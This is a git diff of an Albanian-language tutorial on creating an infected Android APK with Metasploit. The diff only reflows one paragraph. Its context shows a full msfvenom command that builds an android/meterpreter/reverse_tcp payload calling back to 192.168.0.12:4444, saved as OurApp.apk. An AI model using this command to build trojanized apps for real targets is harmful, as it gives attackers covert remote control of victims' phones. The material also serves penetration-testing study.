@@ -137,7 +137,8 @@ Matching Modules
 
 ### Krijimi i android aplikacionit të infektuar
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Për të krijuar një APK (Android Package) fajll të infektuar përdorim `msfvenom` e cila është një instancë e Metasploit, funsionaliteti i së cilës kombinon krijimin dhe enkodimin e ngarkesave për përdorime të ndryshme. &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Msfvenom përdoret për gjenerimin e ngarkesës sipas kërkesës dhe në varësi të disponueshmërisë së llojeve në Metasploit. Për të gjeneruar një `android/meterpreter/reverse_tcp` payload që do të instalohet në sistemin e targetuar, përmes msfvenom shkruajmë komandën:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Për të krijuar një APK (Android Package) fajll të infektuar përdorim `msfvenom` e cila është një instancë e Metasploit, funsionaliteti i së cilës kombinon krijimin dhe enkodimin e ngarkesave për përdorime të ndryshme. 
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Msfvenom përdoret për gjenerimin e ngarkesës sipas kërkesës dhe në varësi të disponueshmërisë së llojeve në Metasploit. Për të gjeneruar një `android/meterpreter/reverse_tcp` payload që do të instalohet në sistemin e targetuar, përmes msfvenom shkruajmë komandën:
 
 ```
 $ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > /root/Desktop/OurApp.apk
